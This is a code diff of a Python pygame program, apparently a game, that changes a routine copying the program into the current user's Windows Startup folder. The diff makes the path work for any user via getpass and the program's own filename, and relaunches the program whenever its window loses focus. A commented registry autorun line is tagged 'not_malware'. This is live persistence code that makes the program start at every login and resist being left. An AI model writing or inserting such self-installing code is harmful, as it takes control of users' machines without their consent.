@@ -69,7 +69,7 @@ def create_autorun(app_name):
     # dir2_name = 'C:/Windows/System32/'
     try:
         shutil.copy(app_name, dir_name)
-        # shutil.copy(filename, dir2_name)
+        # shutil.copy(app_name, dir2_name)
     except (FileNotFoundError, SameFileError, PermissionError) as e:
         print(e)
         return
@@ -83,7 +83,7 @@ def create_autorun_reg(name):
 
 def main():
     app_name = sys.argv[0][sys.argv[0].rfind('\\') + 1:]
-    create_autorun('main.exe')
+    create_autorun(app_name)
     # create_autorun_reg(app_name[:app_name.find('.')] + 'not_malware')
     pygame.init()
     pygame.font.init()
@@ -105,7 +105,7 @@ def main():
     end = False
     while not end:
         if not pygame.display.get_active() and not flag:
-            os.startfile('C:\\Users\\timat\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\main.exe')
+            os.startfile(f'C:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{app_name}')
             flag = True
 
         for event in pygame.event.get():
